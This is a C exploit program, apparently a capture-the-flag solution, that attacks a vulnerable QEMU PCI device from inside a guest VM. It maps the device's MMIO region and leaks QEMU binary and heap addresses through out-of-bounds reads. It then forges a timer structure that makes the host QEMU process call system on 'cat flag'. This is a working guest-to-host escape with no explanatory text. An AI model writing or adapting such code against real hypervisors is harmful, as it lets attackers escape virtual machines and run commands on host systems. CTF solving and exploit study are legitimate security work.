#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/io.h>

void * mmio;

uint32_t mmio_read(uint32_t addr){
    return *(uint32_t *)(mmio + addr);
}

void mmio_write(uint32_t addr, uint64_t val){
    *(uint64_t *)(mmio + addr) = val;
}

uint64_t read_val(int offset){
    uint64_t val;
    mmio_write(0x10, offset + 4);
    val = mmio_read(0x20);
    mmio_write(0x10, offset);
    val = (val << 32) + mmio_read(0x20);
    return val;
}

void write_val(int offset, uint64_t val){
    mmio_write(0x20, ((uint64_t)offset << 32) + (val & 0xffffffff));
    mmio_write(0x20, ((uint64_t)(offset + 4) << 32) + (val >> 32));
}

int main(){
    int  mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    mmio         = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, 0);

    uint64_t elf_addr = read_val(-192);
    printf("[*] leak the elf_addr is : %#lx\n", elf_addr);
    uint64_t heap_addr = read_val(-192 + 8);
    printf("[*] leak the heap_addr is : %#lx\n", heap_addr);

    uint64_t elf_base = elf_addr - 0xf581e0;
    uint64_t system_plt = elf_base + 0x312040;
    uint64_t main_loop_tlg = elf_base + 0x14b9480;
    uint64_t vn_buf_addr = heap_addr + 0xb40;

    uint64_t timer_list_addr = read_val(main_loop_tlg + 8 - vn_buf_addr);
    printf("[*] leak the timer_list_addr is : %#lx\n", timer_list_addr);

    uint64_t fake_timer_addr = vn_buf_addr;
    uint64_t cmd_addr = fake_timer_addr + 0x30;
    write_val(8, timer_list_addr);
    write_val(0x10, system_plt);
    write_val(0x18, cmd_addr);
    write_val(0x30, 0x67616c6620746163);

    mmio_write(0x10, timer_list_addr + 0x40 - vn_buf_addr);
    mmio_write(0x30, fake_timer_addr);
}